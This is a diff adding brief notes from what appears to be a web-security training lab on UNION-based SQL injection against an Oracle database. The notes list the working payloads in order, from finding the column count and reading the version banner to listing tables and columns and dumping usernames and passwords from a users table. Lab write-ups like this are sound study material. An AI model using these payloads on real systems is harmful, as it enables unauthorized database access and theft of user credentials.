@@ -1,0 +1,20 @@
+Lab #09: Listing the database contents on Oracle
+
+Number of columns
+' order by 2--
+
+Column containing the text
+' union select 'a','b'from dual--
+
+version of the database
+' union select banner,null from v$version--
+
+Listing all the tables
+' union select table_name,null from all_tables--
+
+Listing all columns from table USERS_SOHJJL
+' union select column_name,null FROM all_tab_columns WHERE table_name = 'USERS_SOHJJL'--
+
+Listing all the users username and password from the columns USERNAME_ZEYPXF and PASSWORD_GEGJDO
+' union select USERNAME_ZEYPXF,PASSWORD_GEGJDO FROM USERS_SOHJJL --
+
